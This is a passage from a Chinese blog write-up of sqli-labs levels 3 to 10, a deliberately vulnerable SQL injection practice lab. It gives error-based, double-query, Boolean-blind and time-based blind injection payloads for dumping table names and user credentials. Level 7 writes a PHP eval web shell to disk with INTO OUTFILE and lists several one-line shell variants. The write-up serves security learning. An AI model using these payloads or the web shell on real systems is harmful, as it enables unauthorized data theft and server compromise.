+<h2 id="Less-3-基于错误的GET单引号变形字符型注入"><a href="#Less-3-基于错误的GET单引号变形字符型注入" class="headerlink" title="Less-3 基于错误的GET单引号变形字符型注入"></a>Less-3 基于错误的GET单引号变形字符型注入</h2><p>输入单引号,报错<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/cf47889423b7b0facf1b543f26c2a522.png" alt="less-3_1"><br>根据报错信息单引号中的内容可猜测SQL语句为:<br>select * from 表名 where id=( ‘1’ ) …<br>用布尔报错证明:</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and 1=1--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/a8736beaf2a9ffbf955219ea4913d22d.png" alt="less-3_2"><br>还是报错,加有括号( ) )试试<br>payload: <code>?id=1&#39;) and 1=1--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/9143f12bd0a3dbea73f85d0f5c9d2392.png" alt="less-3_3"><br>发现加括号后回显正常,证明猜想正确<br>也可以看看源码:(推荐做完题看源码, 了解php传参语句, 过滤语句)<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/228c5c6b45efd478ba14ae405ef1bb8a.png" alt="less-3_4"><br>源码显示结果也与猜想一致</p>
+</blockquote>
+<p>然后就依次:</p>
+<ul>
+<li>爆库</li>
+<li>爆表</li>
+<li>爆字段</li>
+<li>爆内容</li>
+</ul>
+<p>具体操作步骤同上面Less-1和Less-2</p>
+<hr>
+<h2 id="Less-4-基于错误的GET双引号字符型注入"><a href="#Less-4-基于错误的GET双引号字符型注入" class="headerlink" title="Less-4 基于错误的GET双引号字符型注入"></a>Less-4 基于错误的GET双引号字符型注入</h2><p><code>与Less-3几乎一样, 将payload中的单引号换做双引号就OK</code></p>
+<hr>
+<h2 id="Less-5-双注入GET单引号字符型注入"><a href="#Less-5-双注入GET单引号字符型注入" class="headerlink" title="Less-5 双注入GET单引号字符型注入"></a>Less-5 双注入GET单引号字符型注入</h2><p>输入单引号,报错,输入两个单引号,正常回显,可判断此处存在注入<br>通过布尔进行验证猜想<br><code>payload1: ?id=1&#39; and 1=1</code></p>
+<p><code>payload2: ?id=1&#39; and  1=2</code></p>
+<p>发现and后面为真时, 有回显 , 为假时无回显</p>
+<ul>
+<li>为真时:<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/231a6b672c5c7674c9db03ec9c778ffb.png" alt="less-5_1"></li>
+<li>为假时:<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7eb10475f244babc1b7997ac93f5e0d0.png" alt="less-5_2"><br>不管如何深入测试,页面只显示”You are in…….”,以为是盲注, 查看源码后才的知, 参数进去执行后的数据结果根本没打印,只要正确执行就打印”You are in………”<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6885541a946fc4e22ceed657242727e5.png" alt="less-5_3"><br>立马…还是没想到(原来是传说中的<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Mikasa233/p/10432913.html">双注入</a>))<br><code>双注入(双查询): 其实就是一个select语句中再嵌套一个select语句</code></li>
+</ul>
+<p>极端的问题需要极端的手段来解决, 既然无法正确显示, 那就逆着来呗, 给它整一个错误回显,  把想要的内容同报错信息一起显示出来(所谓的报错注入…) </p>
+<ul>
+<li>想法有了,实际操作呢?<br>别慌…先来了解常用几个报错函数:<blockquote>
+<p>updatexml()    #MYSQL对XML文档数据进行查询和修改的XPATH函数.<br>extractvalue()  #MYSQL对XML文档数据进行查询的XPATH函数.<br>floor()           # MYSQL中用来取整的函数</p>
+</blockquote>
+</li>
+</ul>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,database()),0)--+</code><br>其中concat: 把传进去的两个参数组合成一个完整的参数再打印出   0x7e为 ~ 的16进制(避免报错内容不被吃掉(也可用其他符号的16进制))</p>
+</blockquote>
+<blockquote>
+<p><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/619827c2ce7134c99eb0515c1d073401.png" alt="less-5_4"><br>可以看出数据库信息和报错信息一起被回显   到页面</p>
+</blockquote>
+<p>现在按注入顺序进行注入:</p>
+<ol>
+<li><p>爆库名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,database()),0)--+</code></p>
+</blockquote>
+</li>
+<li><p>爆表名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39;)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/e481a4f8026939c2046048d4c4483775.png" alt="less-5_5"><br>由于报错只能一次显式一行, 所以我们使用limit 逐次进行表名获取(也可以使用 group_concat(table_name)全部打印)<br>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/5739f3f49a192e9b6d7239a0e99669c3.png" alt="less-5_6"><br>爆出数据库’security’ 中的第一个表 ‘email’<br>接着爆后面的表,将limit 0,1  依次换成limit 1,1\ limit 2,1….<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7f8c95ba46199547ddc104501346400c.png" alt="less-5_7"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/12f084069fe6e0c7bd893f060281a505.png" alt="less-5_8"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/aafb93a7aab5848fadcb9cfa316fc1ba.png" alt="less-5_9"><br>依次爆出 第二个表为 ‘referers’ ,第三个表为’uagents’ , 第四个表为 ‘users’<br>当开始爆下一个表的时候:<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/9830cc7dc7529b65cd2982ed02d9b881.png" alt="less-5_10"><br>无回显, 说明当前数据库只有四个表   </p>
+</blockquote>
+</li>
+<li><p>爆表users中字段名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)),0)--+</code><br>操作同2, 依次爆出表users中的字段为’id, username, password’ 三个字段</p>
+</blockquote>
+</li>
+<li><p>爆字段username和password中的内容</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and updatexml(1,concat(0x7e,(select concat_ws(0x3a,username,password) from security.users limit 0,1)),0)--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/33b43febf80f09cda6292c314c10b131.png" alt="less-5_11"><br>其他内容也是通过改变limit的值依次获取<br>Game Over~~</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h2 id="Less-6-双注入GET双引号字符型注入"><a href="#Less-6-双注入GET双引号字符型注入" class="headerlink" title="Less-6 双注入GET双引号字符型注入"></a>Less-6 双注入GET双引号字符型注入</h2><p><code>操作流程同Less-5一模一样, 只需要将payload中的单引号换做双引号就OK, 此处不再赘述</code></p>
+<hr>
+<h2 id="Less-7-导出文件GET字符型注入"><a href="#Less-7-导出文件GET字符型注入" class="headerlink" title="Less-7 导出文件GET字符型注入"></a>Less-7 导出文件GET字符型注入</h2><p>into outfile: 写入文件操作</p>
+<blockquote>
+<p>前提：<br>    1. 文件名必须是全路径(绝对路径)<br>    2. 用户必须有写文件的权限<br>    3. 没有对单引号’过滤</p>
+</blockquote>
+<pre><code>路径里面两个反斜杠\可以换成一个正斜杠/PHP 语句没有单引号的话，必须转换成十六进制要是想省略单引号&#39;的话,必须转换成十六进制</code></pre>
+<p><strong>常用一句话格式:</strong> </p>
+<blockquote>
+<?php eval(\$_POST["admin"]); ?>
+<?php eval(\$_GET["admin"]); ?>
+<?php @eval(\$_POST["admin"]); ?>
+<?php phpinfo(); ?>
+<?php eval($_POST["admin"]); ?>
+<p>有时候得写成<br><?php eval(\\\$_POST["admin"]); ?></p>
+</blockquote>
+<hr>
+<blockquote>
+<p>payload:<code>?id=-1&#39;)) union select 1,2,&#39;&lt;?php @eval($_POST[&quot;cmd&quot;]);?&gt;&#39; into outfile  &quot;C:\\phpStudy\\PHPTutorial\\WWW\\sqli-labs-master\\demo.php&quot;--+  </code><br>PS: <?php @eval($_POST["cmd"]);?>为一句话木马,这里不再赘述.</p>
+</blockquote>
+<p><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/aef8aa7bf5b7e7b89aef0f9ca2ecd16a.png" alt="less-7_1"></p>
+<p>虽然回显报错，但是查看本地文件已经写入了demo.php<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/b582aa65aa9af20056d04ff7bfb18d98.png" alt="less-7_2"><br>接下来,上<strong>蚁剑</strong>(现在本地浏览器访问一下(即运行)上传的文件,否则不然连不上)<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/129c82cf80f6d719494deeebf3792cfa.png" alt="less-7_3"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/adbafna234fgf719494deeebf3792cfa.png" alt="less-7_4"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/24817486e6b08f1034a7d6fd194b7475.png" alt="less-7_5"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/ba51718817d3e669a7ce647613d36386.png" alt="less-7_6"><br>连接成功,然后便可以反键进入终端shell操作, 此处不再赘述.</p>
+<blockquote>
+<p>PS: 需要mysql数据库开启secure-file-priv写文件权限，否则不能写入文件。<br>​</p>
+</blockquote>
+<hr>
+<h2 id="Less-8-布尔型单引号GET盲注"><a href="#Less-8-布尔型单引号GET盲注" class="headerlink" title="Less-8 布尔型单引号GET盲注"></a>Less-8 布尔型单引号GET盲注</h2><p>题目名字暴露一切.布尔值无非为真和为假<br>先介绍几基于盲注的函数:</p>
+<blockquote>
+<p>length: 用来计算数据库表名长度<br>concat(): 没有分隔符的连接字符串<br>concat_ws(): 含有分隔符地连接字符串<br>group_concat(): 连接一个组的所有字符串，并以逗号分隔每一条数据<br>substr(): 截取支付串<br>mid(): 截取字符串<br>ascii(): 返回字符串的数值(ASCII返回值是0-255)<br>ord(): 返回字符串数值</p>
+</blockquote>
+<ol>
+<li><p>简单测试<br>布尔真时: </p>
+<blockquote>
+<p>payload: <code>?id=1&#39;  and  1=1--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6376170d3ba33250f0d759dbad87e39d.png" alt="less-8_1"><br>回显 You are in………..<br>布尔假时:<br>payload: <code>?id=1&#39; and 1=2--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/73a1d380f295876ef1fe557930979a08.png" alt="less-8_2"><br>回显为空</p>
+</blockquote>
+</li>
+<li><p>通过order by测试字段数</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; order by 3--+</code></p>
+</blockquote>
+</li>
+<li><p>构造payload,测试数据库名长度</p>
+<blockquote>
+<p> payload: <code>?id=1&#39; and length(database())=8--+</code></p>
+</blockquote>
+</li>
+</ol>
+<p>同理表名段名</p>
+<ol start="4">
+<li>爆库名<blockquote>
+<p>payload: <code>?id=1&#39; and mid(database(),1,1)=&#39;s&#39;--+</code><br>回显正常即字符匹配成功<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/045947d9e2adb48e2c7cbf8aa436dfbc.png" alt="less-8_3"></p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>即数据库第一个字符为’s’, 接下来测第二个字符<br>payload: <code>?id=1&#39; and mid(database(),2,1)=&#39;e&#39;--+</code><br>即依次将mid()函数第二个参数1,2,3….8<br>所得字符依次为 security, 即数据库名为<strong>security</strong></p>
+</blockquote>
+<p>上述方法查询比较费时费力, 可以使用ascii函数直接查询字符对应的数值</p>
+<blockquote>
+<p>payload:  <code>?id=1&#39; and ascii(mid(database(),1,1))&gt;100--+</code><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/6b50cf801c89ffdc97c6343517240b1c.png" alt="less-8_4"></p>
+</blockquote>
+<p> 布尔值为真时回都显为You are in………..</p>
+<blockquote>
+<p>可以通过使用二分法,减少查询时间<br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/2a5c06f7c032d6bdf99db3ee1829b4ae.png" alt="less-8_5"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/c3de357635e9761fd78cfac793396a11.png" alt="less-8_6"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/d25e5a24f678d0d4722c2007a86a00a2.png" alt="less-8_7"><br><img src="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/7674afc406390c2427bbe3bcac18ec9e.png" alt="less-8_8"><br>可知第一个字符的ASCII大于114,但不大于115,即该字符的ASCII值为115,对应的字符为s<br>后面字符测试与上述一致,只需改变mid()函数第二个参数即可(其中mid()函数也可用substr()函数代替)<br>依次可得库名所含字符的ascii值为115, 101, 99, 117, 114, 105, 116, 121, 所对应的字符依次为<strong>security</strong></p>
+</blockquote>
+<ol start="5">
+<li><p>爆表名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)=101--+</code><br>测试方法与上述一致, 只需将limit 0,1中<strong>0</strong>依次改变为1,2,3…即可查询第一,二,三…个表名<br>依次测得表名为<strong>emails, referers, uagents, users</strong></p>
+</blockquote>
+</li>
+<li><p>爆列名</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and ascii(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))&gt;104--+</code><br>依次可得列名为: id, username, password</p>
+</blockquote>
+</li>
+<li><p>查数据(以第一行数据为例)</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and ascii(mid((select password from security.users limit 0,1),1,1))=68--+</code><br>依次可得第一行数据的password为<strong>Dumb</strong>, password为<strong>Dumb</strong><br>其他数据可自行尝试.<br>Game Over~~</p>
+</blockquote>
+</li>
+</ol>
+<hr>
+<h2 id="Less-9-基于时间的GET单引号盲注"><a href="#Less-9-基于时间的GET单引号盲注" class="headerlink" title="Less-9 基于时间的GET单引号盲注"></a>Less-9 基于时间的GET单引号盲注</h2><p>由题目可知,本关为盲注<br>先安利一个函数:<br><strong>if(condition,a,b):  当condition为true的时候，返回a，当condition为false的时候，返回b</strong><br>这里因为我们利用的是时间的延迟，贴图就没有意义了，这里只写 payload 了：（正确的时<br>候直接返回，不正确的时候等待 5 秒钟，只贴正确的）</p>
+<ol>
+<li><p>测试数据库长度</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and if(length(database())=8,sleep(5),1)--+</code><br>即长度为8时会等待5秒  </p>
+</blockquote>
+</li>
+<li><p>爆数据库</p>
+<blockquote>
+<p>payload: <code>?id=1&#39; and if(ascii(mid(database(),1,1))=115,sleep(5),1)--+</code><br>ASCII值为115,说明第一位字符为 s </p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>payload: <code>?id=1&#39; and if(ascii(mid(database(),2,1))=101,sleep(5),1)--+</code><br>ASCII值为101,说明第二位字符为 e</p>
+</blockquote>
+<p>…<br>以此类推,可得数据库名为 security</p>
+<ol start="3">
+<li>爆表名<blockquote>
+<p>payload: <code>?id=1&#39; and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))=101,sleep(5),1)--+</code><br>ASCII值为101, 说明第一个表的第一位字符为 e<br>…<br>以此类推可得第一个表的名称为 emails</p>
+</blockquote>
+</li>
+</ol>
+<blockquote>
+<p>payload: <code>?id=1&#39; and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 1,1),1,1))=114,sleep(5),1)--+</code><br>ASCII值为114, 说明第一个表的第一位字符为 r<br>…<br>以此类推可得第一个表的名称为 referers</p>
+</blockquote>
+<p>…<br>再以此类推，我们可以得到所有的数据表 emails,referers,uagents,users</p>
+<ol start="4">
+<li>爆users表的列名</li>
+</ol>
+<blockquote>
+<p>payload: <code>?id=1&#39; and if(ascii(mid((select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1),1,1))=105,sleep(5),1)--+</code><br>ASCII值为105, 说明第一个表的第一位字符为 i<br>…<br>以此类推, 可得users表的所有列名为 id, username, password</p>
+</blockquote>
+<p>以上便是基于时间的盲注的所有内容<br>如果想测试内容的可自行测试, 方法同上<br>Game Over~~</p>
+<hr>
+<h2 id="Less-10-基于时间的双引号盲注"><a href="#Less-10-基于时间的双引号盲注" class="headerlink" title="Less-10 基于时间的双引号盲注"></a>Less-10 基于时间的双引号盲注</h2><p>从标题就可以看到 《基于时间-双引号》，所以很明显的这关要我们利用延时注入<br>进行，同时 id 参数进行的是 “ 的处理。和 less9 的区别就在于单引号（‘）变成了（“）,我<br>们这里给出一个 payload 示例，其他的请参考 less-9<br><strong>爆数据库</strong></p>
+<blockquote>
+<p>payload: <code>?id=1&quot; and if(ascii(mid(database(),1,1))=115,sleep(5),1)--+</code><br>其余的请参考Less-9</p>
+</blockquote>
+<p>Game Over~~</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/">
+                    XSS测试备忘录
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2019/11/26/CTF%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/">
+                    CTF入门指北
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1-10"><span class="toc-number">1.</span> <span class="toc-text">Less 1-10</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-1-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.1.</span> <span class="toc-text">Less-1 基于错误的GET单引号字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-2-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E6%95%B4%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">Less-2 基于错误的GET整型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-3-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%8F%98%E5%BD%A2%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">Less-3 基于错误的GET单引号变形字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-4-%E5%9F%BA%E4%BA%8E%E9%94%99%E8%AF%AF%E7%9A%84GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.4.</span> <span class="toc-text">Less-4 基于错误的GET双引号字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-5-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8D%95%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.5.</span> <span class="toc-text">Less-5 双注入GET单引号字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-6-%E5%8F%8C%E6%B3%A8%E5%85%A5GET%E5%8F%8C%E5%BC%95%E5%8F%B7%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.6.</span> <span class="toc-text">Less-6 双注入GET双引号字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-7-%E5%AF%BC%E5%87%BA%E6%96%87%E4%BB%B6GET%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.7.</span> <span class="toc-text">Less-7 导出文件GET字符型注入</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-8-%E5%B8%83%E5%B0%94%E5%9E%8B%E5%8D%95%E5%BC%95%E5%8F%B7GET%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.8.</span> <span class="toc-text">Less-8 布尔型单引号GET盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-9-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84GET%E5%8D%95%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.9.</span> <span class="toc-text">Less-9 基于时间的GET单引号盲注</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Less-10-%E5%9F%BA%E4%BA%8E%E6%97%B6%E9%97%B4%E7%9A%84%E5%8F%8C%E5%BC%95%E5%8F%B7%E7%9B%B2%E6%B3%A8"><span class="toc-number">1.10.</span> <span class="toc-text">Less-10 基于时间的双引号盲注</span></a></li></ol></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/" title="上一篇: XSS测试备忘录">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/11/26/CTF%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/" title="下一篇: CTF入门指北">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2020/10/26/Bilibili-CTF1024-%E5%B9%B2%E6%9D%AF/">Bilibili CTF1024 干杯</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/10/19/Git%E6%B3%84%E9%9C%B2/">Git泄露</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/15/XSS%E6%B5%8B%E8%AF%95%E5%A4%87%E5%BF%98%E5%BD%95/">XSS测试备忘录</a></li><li class="post-list-item"><a class="post-list-link" href="/2020/08/12/sqli-labs-%E9%80%9A%E5%85%B3writeup-1-10/">sqli-labs-通关writeup 1-10</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/26/CTF%E5%85%A5%E9%97%A8%E6%8C%87%E5%8C%97/">CTF入门指北</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2020 逆时针向
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 5;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+            
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
